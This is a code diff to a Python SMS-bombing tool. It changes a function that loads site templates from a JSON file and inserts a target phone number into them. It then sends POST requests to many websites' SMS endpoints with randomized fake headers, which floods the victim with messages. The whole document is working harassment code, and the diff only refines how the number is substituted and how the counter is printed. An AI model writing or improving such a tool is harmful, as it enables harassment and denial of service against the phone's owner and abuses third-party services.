@@ -46,6 +46,10 @@ def sms_bomber():
     with open('./json_files/sms.json') as f:
         templates = json.load(f)
 
+    string_templates = str(templates)
+    string_templates = string_templates.replace("numnum", phone_number).replace("\'", "\"")
+
+    templates = json.loads(string_templates)
 
     for section, commands in templates.items():
         sites_for_bombing.append(section)
@@ -53,21 +57,18 @@ def sms_bomber():
     for site in enumerate(sites_for_bombing):
         
         try:
-            ua = fake_useragent.UserAgent()
-            random_ua = ua.random
-
             url = templates[site[1]]["url"]
             data_for_json = templates[site[1]]["data"]
             header = fake_headers.Headers(headers=True)
             headers = header.generate()
-            
+
             r = requests.post(url = url, json = data_for_json, headers = headers)
             
 
             if str(r) == '<Response [200]>':
-                print(f"{site[0]} Sms successfully send")
+                print(f"{site[0]+1} Sms successfully send")
             else:
-                print(f"{site[0]} I cant send this sms")
+                print(f"{site[0]+1} I cant send this sms")
 
         except Exception as ex:
             print("Error while sending sms")
